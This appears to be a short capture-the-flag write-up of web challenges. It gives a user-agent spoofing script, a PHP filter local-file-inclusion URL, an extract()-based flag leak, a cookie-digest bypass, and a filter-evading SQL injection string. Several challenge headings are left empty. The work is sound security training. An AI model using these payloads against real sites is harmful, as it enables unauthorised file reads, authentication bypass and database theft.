# Web 
## Agent 95 (50)

Set user agent as Windows 95:

https://developers.whatismybrowser.com/useragents/parse/2520-internet-explorer-windows-trident

```python
import requests

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    # windows 95 user agent
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
}

response = requests.get('http://jh2i.com:50000/', headers=headers, verify=False)
```

## Localghost (75)

Check local storage

![](images/2020-06-17-21-33-43.png)

## Phphonebook (100)

LFI vulnerability:
```
http://jh2i.com:50002/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

~index.php~ contains this juicy bit:
```
<?php
      extract($_POST);

    	if (isset($emergency)){
    		echo(file_get_contents("/flag.txt"));
    	}
    ?>
```

So just add emergency to POST request

## Official Business (125)

```python
def load_cookie():

    cookie = {}
    auth = request.cookies.get("auth")
    if auth:

        try:
            cookie = json.loads(binascii.unhexlify(auth).decode("utf8"))
            digest = cookie.pop("digest")

            if (
                digest
                != hashlib.sha512(
                    app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
                ).hexdigest()
            ):
                return False, {}
        except:
            pass

    return True, cookie
```

Thrown exceptions pass the `load_cookie` check, so just send request with no `digest` field in the cookie

## Seriously (125)
## Extraterrestrial (125)
## Rejected Sequel (150)

`"/**/union/**/select/**/flag/**/FFROMROM/**/flag/**/WWHEREHERE/**/TRUE/**/or/**/""="
`
## B'omarr Style (200)
## Flag Jokes (200)
## Mongolian BBQ (225)
## Criss Cross (400)
## Trash The Cache (1000)
